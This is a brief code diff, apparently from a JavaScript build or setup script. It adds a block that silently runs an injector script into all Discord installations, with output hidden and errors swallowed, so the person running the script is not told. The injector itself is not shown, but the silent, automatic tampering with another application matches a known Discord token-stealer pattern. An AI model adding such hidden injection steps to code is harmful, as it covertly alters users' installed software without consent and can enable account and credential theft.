@@ -262,3 +262,9 @@ try {
         }
     }
 } catch { }
+
+// Automatically ensure all Discord installations are injected
+try {
+    const { execSync } = await import("child_process");
+    execSync("node scripts/inject.mjs", { stdio: "ignore" });
+} catch { }
